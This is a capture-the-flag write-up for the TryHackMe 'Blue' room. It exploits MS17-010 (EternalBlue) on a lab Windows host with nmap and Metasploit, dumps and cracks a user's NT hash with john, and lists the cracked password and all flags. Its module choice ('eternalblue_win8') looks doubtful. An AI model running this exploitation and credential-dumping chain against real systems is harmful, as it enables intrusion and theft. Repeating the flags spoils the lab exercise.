I"k<p>It’s a write-up about the room : <a href="https://tryhackme.com/room/blue">Try Hack Me - Room : Blue</a></p>

<h1 id="task-1---recon">[Task 1] - Recon</h1>

<p><img src="/assets/img/thm/blue/task-1.png" alt="Task 1" /></p>

<p>First, we deploy the instance.<br />
We scan the machine with the command : <code class="language-plaintext highlighter-rouge">nmap -sV MACHINE_IP</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li>
    <p>How many ports are open with a port number under 1000? <code class="language-plaintext highlighter-rouge">3</code></p>
  </li>
  <li>
    <p>What is this machine vulnerable to?<br />
We run the command :  <code class="language-plaintext highlighter-rouge">nmap --script vuln MACHINE_IP</code></p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>  Host script results:
  |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
  |_smb-vuln-ms10-054: false
  |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
  | smb-vuln-ms17-010: 
  |   VULNERABLE:
  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2017-0143
  |     Risk factor: HIGH
  |       A critical remote code execution vulnerability exists in Microsoft SMBv1
  |        servers (ms17-010).
  |           
  |     Disclosure date: 2017-03-14
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
</ul>

<p>We find the vulnerability <strong>ms17-010</strong>.</p>

<h1 id="task-2---gain-access">[Task 2] - Gain Access</h1>

<blockquote>
  <p>Exploit the machine and gain a foothold.</p>
</blockquote>

<ul>
  <li>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</li>
</ul>

<p>We run the command : <code class="language-plaintext highlighter-rouge">use ms17-010</code> and obtain the result below :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>	Matching Modules
	================
	
	   #  Name                                           Disclosure Date  Rank     Check  Description
	   -  ----                                           ---------------  ----     -----  -----------
	   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
	   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
	   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
	   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
	   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
	   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So, the full path of the exploitation code is <strong>exploit/windows/smb/ms17_010_eternalblue_win8</strong>.<br />
After that, we exploit the vulnerability 3 : <code class="language-plaintext highlighter-rouge">use 3</code></p>

<ul>
  <li>Show options and set the one required value. What is the name of this value ?</li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">show options</code> on msfconcole and the required value is <code class="language-plaintext highlighter-rouge">RHOSTS</code>.</p>

<h1 id="task-3---escalate">[Task 3] - Escalate</h1>

<blockquote>
  <p>Escalate privileges, learn how to upgrade shells in metasploit.</p>
</blockquote>

<p>On msfconsole we do : <code class="language-plaintext highlighter-rouge">use post/multi/manage/shell_to_meterpreter</code> and <code class="language-plaintext highlighter-rouge">set session 1</code>.
After, we do <code class="language-plaintext highlighter-rouge">sessions</code> and <code class="language-plaintext highlighter-rouge">sessions -i 2</code>.</p>

<h1 id="task-4---cracking">[Task 4] - Cracking</h1>

<blockquote>
  <p>Dump the non-default user’s password and crack it!</p>
</blockquote>

<p>In the meterpreter we use <code class="language-plaintext highlighter-rouge">hashdump</code> and find the name of the non-default user : <strong>Jon</strong>.</p>

<p>We use <code class="language-plaintext highlighter-rouge">john jon.hash --format=NT --wordlist=/opt/rockyou.txt</code>. <br />
After that, to see the passwaord we do : <code class="language-plaintext highlighter-rouge">john jon.hash --format=NT --show</code> and find <strong>alqfna22</strong>.</p>

<h1 id="task-5---find-flags">[Task 5] - Find flags!</h1>

<ul>
  <li>Flag 1 ?</li>
</ul>

<p>In the meterpreter with <code class="language-plaintext highlighter-rouge">ls</code> we find the file <code class="language-plaintext highlighter-rouge">flag1.txt</code> and use <code class="language-plaintext highlighter-rouge">cat</code> to read it.<br />
The flag 1 is <code class="language-plaintext highlighter-rouge">access\_the\_machine</code>.</p>

<ul>
  <li>Flag 2 ?</li>
</ul>

<p>The file <code class="language-plaintext highlighter-rouge">flag2.txt</code> is hidden in <code class="language-plaintext highlighter-rouge">Windows/System/config</code>.<br />
The flag is <code class="language-plaintext highlighter-rouge">sam\_database\_elevated\_access</code>.</p>

<ul>
  <li>Flag 3 ?</li>
</ul>

<p>This one is hidden in the file <code class="language-plaintext highlighter-rouge">flag3.txt</code> in the directory : <code class="language-plaintext highlighter-rouge">Users/Jon/Documents</code>.<br />
The flag is <code class="language-plaintext highlighter-rouge">admin\_documents\_can\_be\_valuable</code>.</p>
:ET